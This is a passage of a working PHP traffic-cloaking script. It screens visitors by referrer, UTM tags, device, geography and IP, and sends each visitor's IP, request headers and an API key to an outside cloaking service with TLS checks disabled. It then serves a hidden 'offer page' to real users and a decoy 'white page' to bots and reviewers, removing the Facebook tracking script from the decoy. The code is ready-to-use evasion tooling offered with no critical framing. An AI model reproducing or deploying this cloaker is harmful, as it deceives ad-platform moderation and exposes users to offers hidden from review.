            $CLOAKINGdata['REQUEST_METHOD']=$_SERVER['REQUEST_METHOD'];
            if( $_SERVER["SERVER_PORT"]==443 || !empty($_SERVER['HTTPS']) || !empty($_SERVER['SSL']) ) $CLOAKINGdata['HTTP_HTTPS']='1';

            //fix for roadrunner ???
            //$CLOAKINGdata['host']=$CLOAKING['DOMAIN'];//fix for roadrunner ???
            //$CLOAKINGdata['path']=http_build_query ($_GET);//fix for roadrunner ???

            $CLOAKING['banReason']='';
            if(!empty($CLOAKING['allow_utm_must']) || !empty($CLOAKING['allow_utm_opt'])){
                $utmstring=http_build_query($_GET);
                if(!empty($CLOAKING['allow_utm_opt'])) {
                    $CLOAKING['allow_utm_opt'] = preg_replace('#[\s,]+#', '|', $CLOAKING['allow_utm_opt']);
                    $CLOAKING['allow_utm_opt'] = "#" . trim($CLOAKING['allow_utm_opt'], ',') . "#i";
                }
                if(!empty($CLOAKING['allow_utm_must']) && !stristr($utmstring,$CLOAKING['allow_utm_must'])) $CLOAKING['banReason'].='utmfilterm.';
                if(!empty($CLOAKING['allow_utm_opt']) && !preg_match($CLOAKING['allow_utm_opt'],$utmstring)) $CLOAKING['banReason'].='utmfilterk.';
            }
            if(!empty($CLOAKING['block_utm'])) {
                $utmstring=http_build_query($_GET);
                if(!empty($CLOAKING['block_utm']) && stristr($utmstring,$CLOAKING['block_utm'])) $CLOAKING['banReason'].='utmfilterb.';
            }

            if($CLOAKING['NO_REF'] || !empty($CLOAKING['WHITE_REF'])){
                $ref='';
                foreach (array('HTTP_REFERER','Referer','referer','REFERER') as $k){
                    if(!empty($CLOAKINGdata[$k])) {$ref=$CLOAKINGdata[$k];break;}
                    if(!empty($_SERVER[$k])) {$ref=$_SERVER[$k];break;}
                }
                if(empty($ref)) $CLOAKING['banReason'].='noref.';
                elseif(!empty($CLOAKING['WHITE_REF']) && !preg_match("#https?://[^/]*(".$CLOAKING['WHITE_REF'].")#i",$ref)) $CLOAKING['banReason'].='blackref.';
            }
            if($CLOAKING['BLOCK_APPLE'] || $CLOAKING['BLOCK_ANDROID'] || $CLOAKING['BLOCK_WIN'] || $CLOAKING['BLOCK_MOBILE'] || $CLOAKING['BLOCK_DESCTOP']) {
                $ua='';
                foreach (array('HTTP_USER_AGENT','USER-AGENT','User-Agent','User-agent','user-agent') as $k){
                    if(!empty($CLOAKINGdata[$k])) {$ua=$CLOAKINGdata[$k];break;}
                    if(!empty($_SERVER[$k])) {$ua=$_SERVER[$k];break;}
                }
                if($CLOAKING['BLOCK_APPLE'] && stristr($ua,'Mac OS')) $CLOAKING['banReason'].='blockapple.';
                if($CLOAKING['BLOCK_ANDROID'] && stristr($ua,'Android')) $CLOAKING['banReason'].='blockandroid.';
                if($CLOAKING['BLOCK_WIN'] && stristr($ua,'Windows')) $CLOAKING['banReason'].='blockwin.';
                if($CLOAKING['BLOCK_MOBILE'] && (stristr($ua,'like Mac OS X')||stristr($ua,'Android')||stristr($ua,'mobile')||stristr($ua,'table'))) $CLOAKING['banReason'].='blockmobile.';
                if($CLOAKING['BLOCK_DESCTOP'] && !(stristr($ua,'like Mac OS X')||stristr($ua,'Android')||stristr($ua,'mobile')||stristr($ua,'table')))  $CLOAKING['banReason'].='blockdescktop.';
            }
            if($CLOAKING['DELAY_START']) {
                $ip='';
                foreach (array('HTTP_CF_CONNECTING_IP','CF-Connecting-IP','Cf-Connecting-Ip','cf-connecting-ip') as $k){
                    if(!empty($_SERVER[$k])) $ip=$_SERVER[$k];
                }
                if(empty($ip)) {
                    foreach (array('HTTP_FORWARDED', 'Forwarded', 'forwarded', 'REMOTE_ADDR') as $k) {
                        if (!empty($_SERVER[$k])) $ip .= $_SERVER[$k];
                    }
                }
                $ips=file('dummyCounter.txt',FILE_IGNORE_NEW_LINES);
                if(empty($ips)) {$ips=array(0=>0);file_put_contents('dummyCounter.txt',"0\n", FILE_APPEND);}
                else $ips=array_flip($ips);
                $ip=crc32($ip);
                if(!empty($ips[$ip]) && ($CLOAKING['DELAY_PERMANENT'] || sizeof($ips)<=$CLOAKING['DELAY_START'])){
                    $CLOAKING['banReason'].='delaystart.';
                }
                elseif(sizeof($ips)<=$CLOAKING['DELAY_START']) {
                    file_put_contents('dummyCounter.txt',$ip."\n", FILE_APPEND);
                    $CLOAKING['banReason'].='delaystart.';
                }
            }

            $CLOAKINGdata = json_encode($CLOAKINGdata);
            // fix for user's settings errors
            $CLOAKING['ALLOW_GEO']=trim(preg_replace('#[^a-zA-Z,]+#',',',$CLOAKING['ALLOW_GEO']),',');
            $CLOAKING['BLOCK_GEO']=trim(preg_replace('#[^a-zA-Z,]+#',',',$CLOAKING['BLOCK_GEO']),',');
            // Data for ML postprocessing
            $CLOAKING['W_']=(substr($CLOAKING['WHITE_PAGE'],0,8)=='https://' || substr($CLOAKING['WHITE_PAGE'],0,7)=='http://') ? '' : file_get_contents($CLOAKING['WHITE_PAGE']);
            $CLOAKING['O_']=(substr($CLOAKING['OFFER_PAGE'],0,8)=='https://' || substr($CLOAKING['OFFER_PAGE'],0,7)=='http://') ? '' : file_get_contents($CLOAKING['OFFER_PAGE']);
            $CLOAKING['W_CRC']=crc32($CLOAKING['W_']);
            $CLOAKING['O_CRC']=crc32($CLOAKING['O_']);
            $CLOAKING['W_YDX']=preg_match('#[\'"]https://[^/]*yandex\.[^\'"]+\.js#',$CLOAKING['W_']) ? 1:0;
            $CLOAKING['W_FBX']=preg_match('#[\'"]https://[^/]*facebook\.[^\'"]+\.js#',$CLOAKING['W_']) ? 1:0;
            $CLOAKING['W_GGX']=preg_match('#[\'"]https://[^/]*(google|google-analytics)\.[^\'"]+\.js#',$CLOAKING['W_']) ? 1:0;
            $CLOAKING['W_TT']=preg_match('#[\'"]https://[^/]*(google|google-analytics)\.[^\'"]+\.js#',$CLOAKING['W_']) ? 1:0;
            $CLOAKING['O_YDX']=preg_match('#[\'"]https://[^/]*yandex\.[^\'"]+\.js#',$CLOAKING['O_']) ? 1:0;
            $CLOAKING['O_FBX']=preg_match('#[\'"]https://[^/]*facebook\.[^\'"]+\.js#',$CLOAKING['O_']) ? 1:0;
            $CLOAKING['O_GGX']=preg_match('#[\'"]https://[^/]*bytedance\.[^\'"]+\.js#',$CLOAKING['O_']) ? 1:0;
            $CLOAKING['O_TT']=preg_match('#[\'"]https://[^/]*bytedance\.[^\'"]+\.js#',$CLOAKING['O_']) ? 1:0;

            if(!function_exists('curl_init')) $CLOAKING['STATUS'] = @file_get_contents('http://api.hideapi.xyz/basic?ip='.$_SERVER["REMOTE_ADDR"].'&port='.$_SERVER["REMOTE_PORT"].'&banReason='.$CLOAKING['banReason'].'&key='.$CLOAKING['API_SECRET_KEY'].'&sign=92194113106631f1629985810&version='.$CLOAKING['VERSION'].'&wmet='.$CLOAKING['WHITE_METHOD'].'&omet='.$CLOAKING['OFFER_METHOD'].'&wcrc='.$CLOAKING['W_CRC'].'&ocrc='.$CLOAKING['O_CRC'].'&wydx='.$CLOAKING['W_YDX'].'&wfbx='.$CLOAKING['W_FBX'].'&wggx='.$CLOAKING['W_GGX'].'&oydx='.$CLOAKING['O_YDX'].'&ofbx='.$CLOAKING['O_FBX'].'&oggx='.$CLOAKING['O_GGX'].'&js=false&cache='.$CLOAKING['DISABLE_CACHE'].'&geo='.$CLOAKING['ALLOW_GEO'].'&utm='.$CLOAKING['UTM'].'&utmmust='.$CLOAKING['allow_utm_must'].'&utmopt='.$CLOAKING['allow_utm_opt'].'&utmblock='.$CLOAKING['block_utm'].'&mac='.$CLOAKING['BLOCK_APPLE'].'&andr='.$CLOAKING['BLOCK_ANDROID'].'&win='.$CLOAKING['BLOCK_WIN'].'&mob='.$CLOAKING['BLOCK_MOBILE'].'&desk='.$CLOAKING['BLOCK_DESCTOP'].'&delay='.$CLOAKING['DELAY_START'].'&perm='.$CLOAKING['DELAY_PERMANENT'].'&noref='.$CLOAKING['NO_REF'].'&whiteref='.$CLOAKING['WHITE_REF'].'&blockgeo=' .$CLOAKING['BLOCK_GEO'].'&paranoid='.$CLOAKING['PARANOID'] . '&allowvpn=' . $CLOAKING['ALLOW_VPN'].'&white='.urlencode($CLOAKING['WHITE_PAGE']).'&offer='.urlencode($CLOAKING['OFFER_PAGE']) , 'r', stream_context_create(array('ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,), 'http' => array('method' => 'POST', 'timeout' => 5, 'header'=> "Content-type: application/x-www-form-urlencoded\r\n". "Content-Length: ".strlen($CLOAKINGdata). "\r\n", 'content' => $CLOAKINGdata))));
            else $CLOAKING['STATUS'] = @cloakedCurl('http://api.hideapi.xyz/basic?ip='.$_SERVER["REMOTE_ADDR"].'&port='.$_SERVER["REMOTE_PORT"].'&banReason='.$CLOAKING['banReason'].'&key='.$CLOAKING['API_SECRET_KEY'].'&sign=92194113106631f1629985810&version='.$CLOAKING['VERSION'].'&wmet='.$CLOAKING['WHITE_METHOD'].'&omet='.$CLOAKING['OFFER_METHOD'].'&wcrc='.$CLOAKING['W_CRC'].'&ocrc='.$CLOAKING['O_CRC'].'&wydx='.$CLOAKING['W_YDX'].'&wfbx='.$CLOAKING['W_FBX'].'&wggx='.$CLOAKING['W_GGX'].'&oydx='.$CLOAKING['O_YDX'].'&ofbx='.$CLOAKING['O_FBX'].'&oggx='.$CLOAKING['O_GGX'].'&js=false&cache='.$CLOAKING['DISABLE_CACHE'].'&geo='.$CLOAKING['ALLOW_GEO'].'&utm='.$CLOAKING['UTM'].'&utmmust='.$CLOAKING['allow_utm_must'].'&utmopt='.$CLOAKING['allow_utm_opt'].'&utmblock='.$CLOAKING['block_utm'].'&mac='.$CLOAKING['BLOCK_APPLE'].'&andr='.$CLOAKING['BLOCK_ANDROID'].'&win='.$CLOAKING['BLOCK_WIN'].'&mob='.$CLOAKING['BLOCK_MOBILE'].'&desk='.$CLOAKING['BLOCK_DESCTOP'].'&delay='.$CLOAKING['DELAY_START'].'&perm='.$CLOAKING['DELAY_PERMANENT'].'&noref='.$CLOAKING['NO_REF'].'&whiteref='.$CLOAKING['WHITE_REF'].'&blockgeo=' .$CLOAKING['BLOCK_GEO'].'&paranoid='.$CLOAKING['PARANOID'] . '&allowvpn=' . $CLOAKING['ALLOW_VPN'].'&white='.urlencode($CLOAKING['WHITE_PAGE']).'&offer='.urlencode($CLOAKING['OFFER_PAGE']), $CLOAKINGdata);
            $CLOAKING['STATUS'] = json_decode($CLOAKING['STATUS'], true);

            if (empty($CLOAKING['banReason']) && !empty($CLOAKING['STATUS']) && !empty($CLOAKING['STATUS']['action']) && $CLOAKING['STATUS']['action'] == 'allow' && (empty($CLOAKING['ALLOW_GEO']) || (!empty($CLOAKING['STATUS']['geo']) && !empty($CLOAKING['ALLOW_GEO']) && stristr($CLOAKING['ALLOW_GEO'],$CLOAKING['STATUS']['geo'])))) {
                cloakedOfferPage($CLOAKING['OFFER_PAGE'],$CLOAKING['OFFER_METHOD'],$CLOAKING['UTM']);
            }
            else {
                cloakedWhitePage($CLOAKING['WHITE_PAGE'],$CLOAKING['WHITE_METHOD']);
            }

            function cloakedOfferPage($offer,$method='meta',$utm=false){
                if(substr($offer,0,8)=='https://' || substr($offer,0,7)=='http://') {
                    if(!empty($_GET) &&  $utm) {
                        if(strstr($offer,'?')) $offer.= '&'.http_build_query($_GET);
                        else $offer.= '?'.http_build_query($_GET);
                    }
                    if($method=='302') {
                        header("Location: ".$offer);
                    }
                    else if($method=='iframe') {
                        echo "<html><head><title></title></head><body style='margin: 0; padding: 0;'><meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0\"/><iframe src='".$offer."' style='visibility:visible !important; position:absolute; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;' allowfullscreen='allowfullscreen' webkitallowfullscreen='webkitallowfullscreen' mozallowfullscreen='mozallowfullscreen'></iframe></body></html>";
                    }
                    else {
                        echo '<html><head><meta http-equiv="Refresh" content="0; URL=' . $offer . '" ></head></html>';
                    }
                }
                else require_once($offer);// real users
                die();
            }
            function cloakedWhitePage($white,$method='curl'){
                if(substr($white,0,8)=='https://' || substr($white,0,7)=='http://') {
                    if ($method == '302') {
                        header("Location: ".$white);
                    }
                    else {
                        if (!function_exists('curl_init')) $page = file_get_contents($white, 'r', stream_context_create(array('ssl' => array('verify_peer' => false, 'verify_peer_name' => false,))));
                        else $page = cloakedCurl($white);
                        $page = preg_replace('#(<head[^>]*>)#imU', '$1<base href="' . $white . '">', $page, 1);
                        $page = preg_replace('#https://connect\.facebook\.net/[a-zA-Z_-]+/fbevents\.js#imU', '', $page);
                        if (empty($page)) {
                            header("HTTP/1.1 503 Service Unavailable", true, 503);
                        }
                        echo $page;
                    }
                }
                else require_once($white);// bots
                die();
            }
            function cloakedCurl($url,$body='',$returnHeaders=false){
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL,$url);
                if(!empty($body)) {curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, "$body");}
                if(!empty($returnHeaders)) curl_setopt($ch, CURLOPT_HEADER, 1);
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
                curl_setopt($ch, CURLOPT_TIMEOUT, 45);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                $r = @curl_exec($ch);
                curl_close ($ch);
                return $r;
            }
            function cloakedEditor($s){
                $f=file($_SERVER["SCRIPT_FILENAME"]);
                $r=0;
                foreach ($f as $n=>$l){if(strstr($l,$s)) {$r=$n;break;}}
                return $r+1;
            }
            die();
            ?>
